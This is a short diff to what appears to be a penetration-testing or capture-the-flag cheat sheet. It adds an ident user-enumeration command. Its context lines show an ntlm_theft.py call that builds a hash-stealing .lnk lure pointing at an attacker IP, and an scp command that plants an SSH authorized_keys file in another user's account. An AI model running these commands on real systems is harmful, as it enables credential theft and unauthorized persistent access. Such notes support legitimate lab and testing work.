@@ -228,3 +228,8 @@ python3 ntlm_theft.py -g lnk -s <ip> -f vault
 ```bash
 scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
 ```
+---
+# ident 
+```bash
+./ident-user-enum.pl 10.0.0.1 21 80 113 443
+```
